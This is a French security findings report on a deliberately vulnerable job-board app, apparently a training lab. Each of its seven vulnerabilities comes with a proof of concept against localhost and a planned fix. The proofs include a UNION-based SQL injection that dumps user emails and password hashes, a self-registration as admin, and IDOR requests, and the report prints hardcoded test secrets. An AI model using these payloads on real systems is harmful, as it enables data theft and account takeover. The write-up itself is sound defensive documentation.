# Documentation des failles — JobBoard

## VULN-1 : Injection SQL

- **Emplacement** : `app/routes/jobs.js`, route `GET /api/jobs?q=`
- **Cause** : la requête SQL est construite par concaténation directe de la chaîne de recherche, sans paramètre préparé
- **Impact** : un attaquant non authentifié peut lire n'importe quelle table de la base, y compris les e-mails et les mots de passe hachés
- **OWASP** : A03:2021 – Injection

**Preuve**
```
curl.exe "http://localhost:3000/api/jobs?q=zzz%27%20UNION%20SELECT%20id%2Cemail%2Cpassword_hash%2Crole%2CNULL%2CNOW()%20FROM%20users--"
```
```json
[{"id":1,"title":"admin","company":"$2a$10$eeoLa4MnQ6D7auAa4zuqH.3l.jl0wDBl35.h1Zyv6.xaMYvOidIyG", ...},
{"id":2,"title":"candidat@jobboard.test","company":"$2a$10$Jf5EYxZqf2O1rlHJdmobf.iUVVuA1.eLL/01jHJ6Y2rS8vDIekypm", ...}]
```
Les champs `title` et `company` contiennent en réalité des e-mails et des hash de la table `users`.

- **Correction prévue** : requête paramétrée (`WHERE title ILIKE $1`, avec `$1` passé en paramètre, jamais concaténé).

---

## VULN-2 : IDOR (Insecure Direct Object Reference)

- **Emplacement** : `app/routes/applications.js` (`GET /:id`) et `app/routes/cv.js`
- **Cause** : aucune vérification que la candidature demandée appartient bien à l'utilisateur connecté
- **Impact** : un candidat ou un recruteur peut lire la candidature, la lettre de motivation et le CV de n'importe qui en changeant simplement l'identifiant dans l'URL
- **OWASP** : A01:2021 – Contrôle d'accès défaillant

**Preuve**

Le compte connecté a l'identifiant `2` (visible dans le jeton décodé : `"id":2`), mais la requête ci-dessous renvoie une candidature appartenant à l'utilisateur `1` :
```powershell
Invoke-RestMethod -Uri http://localhost:3000/api/applications/1 -Headers @{Authorization = "Bearer $($r.token)"}
```
```
id           : 1
job_id       : 1
candidate_id : 1
cover_letter : yyyy
status       : Nouvelle
```
`candidate_id: 1` ne correspond pas à l'id `2` du compte utilisé : la route ne vérifie pas le propriétaire.

- **Correction prévue** : ajouter `AND candidate_id = $2` (ou `recruiter_id` selon le rôle) dans la requête, avec l'id pris dans le jeton et non dans l'URL.

---

## VULN-3 : Mass assignment du rôle

- **Emplacement** : `app/routes/auth.js`, route `POST /auth/register`
- **Cause** : le champ `role` est lu directement depuis le corps de la requête envoyée par le client, sans restriction
- **Impact** : n'importe quel visiteur peut créer un compte administrateur
- **OWASP** : A01:2021 – Contrôle d'accès défaillant

**Preuve**
```powershell
Invoke-RestMethod -Uri http://localhost:3000/api/auth/register -Method Post -ContentType "application/json" -Body '{"email":"pirate@test.com","password":"test123","role":"admin"}'
```
```
id email           role
-- -----           ----
 3 pirate@test.com admin
```
Le compte `pirate@test.com` a été créé directement avec le rôle `admin`.

- **Correction prévue** : ignorer le champ `role` envoyé par le client ; forcer `role = 'candidat'` à l'inscription, et ne permettre le changement de rôle que par un administrateur authentifié via une route dédiée.

---

## VULN-4 : Secrets en clair

- **Emplacement** : `app/config.js` (clé JWT) et `docker-compose.yml` (mot de passe PostgreSQL)
- **Cause** : les secrets sont écrits en dur dans le code source et le fichier de configuration versionnés
- **Impact** : quiconque accède au dépôt (ou à l'image Docker) peut forger de faux jetons JWT ou se connecter directement à la base de données
- **OWASP** : A02:2021 – Défaillances cryptographiques / A05:2021 – Mauvaise configuration

**Preuve**
```
type app\config.js
```
```js
JWT_SECRET: 'super-secret-jwt-key-2026',
...
password: 'jobboard_pass_123',
```
```
type docker-compose.yml
```
```yaml
POSTGRES_PASSWORD: jobboard_pass_123   # VULN-4 : secret en clair (valeur de test)
```

- **Correction prévue** : retirer ces valeurs du code, les fournir uniquement via des variables d'environnement injectées à l'exécution (ou un coffre à secrets), et les retirer de l'historique Git après rotation.

---

## VULN-5 : Dépendances vulnérables

- **Emplacement** : `app/package.json`
- **Cause** : versions volontairement anciennes d'`express`, `jsonwebtoken`, `lodash`, `multer`, entraînant des dépendances transitives vulnérables (`body-parser`, `qs`, `send`, `path-to-regexp`, `cookie`)
- **Impact** : déni de service, pollution de prototype, contournement de la vérification de signature JWT, injection de commande
- **OWASP** : A06:2021 – Composants vulnérables et obsolètes

**Preuve**
```
npm audit
```
```
9 vulnerabilities (3 low, 6 high)

jsonwebtoken <=8.5.1 — Severity: high
jsonwebtoken vulnerable to signature validation bypass due to insecure default algorithm in jwt.verify()

lodash <=4.17.23 — Severity: high
Command Injection in lodash ; Prototype Pollution in lodash

body-parser <=1.20.8 — Severity: high
vulnerable to denial of service
```

- **Correction prévue** : mettre à jour vers les versions corrigées (`express@4.22.3`, `jsonwebtoken@9.0.3`, `lodash@4.18.1`), puis rejouer `npm audit` pour confirmer que la liste est vide.

---

## VULN-6 : Mauvaise configuration

- **Emplacement** : `app/server.js` (gestion des erreurs, CORS), `app/routes/applications.js` (upload)
- **Cause** : les erreurs serveur renvoient le message et la pile d'appel complète au client ; CORS accepte toutes les origines ; l'upload de CV n'a ni limite de taille ni filtre de type
- **Impact** : fuite d'informations internes (chemins de fichiers, structure du code) utile à un attaquant pour préparer d'autres attaques ; risque de dépôt de fichier malveillant
- **OWASP** : A05:2021 – Mauvaise configuration de sécurité

**Preuve**
```
curl.exe http://localhost:3000/api/jobs/abc
```
```json
{"error":"invalid input syntax for type integer: \"abc\"",
 "stack":"error: invalid input syntax for type integer...\n    at /app/node_modules/pg-pool/index.js:45:11\n    at async /app/routes/jobs.js:21:15"}
```
La réponse révèle le chemin interne `/app/routes/jobs.js:21` et la bibliothèque utilisée (`pg-pool`).

- **Correction prévue** : renvoyer un message générique au client (« Une erreur est survenue ») et garder le détail uniquement dans les logs serveur ; restreindre CORS aux origines connues ; limiter l'upload en taille et en type de fichier (PDF uniquement).

---

## VULN-7 : Contrôle d'accès manquant (élévation de privilège)

- **Emplacement** : `app/routes/admin.js`, route `PATCH /admin/users/:id/deactivate`
- **Cause** : le middleware `requireRole('admin')` est absent de cette route ; seul `auth` (être connecté) est vérifié
- **Impact** : n'importe quel utilisateur authentifié, même un simple candidat, peut désactiver le compte de n'importe qui
- **OWASP** : A01:2021 – Contrôle d'accès défaillant

**Preuve**

Avec le jeton d'un compte candidat (rôle non-admin) :
```powershell
Invoke-RestMethod -Uri http://localhost:3000/api/admin/users/1/deactivate -Method Patch -Headers @{Authorization = "Bearer $($r.token)"}
```
```
ok
--
True
```
La désactivation a réussi alors que le compte utilisé n'est pas administrateur.

- **Correction prévue** : ajouter `requireRole('admin')` sur cette route, comme sur les autres routes de `admin.js`.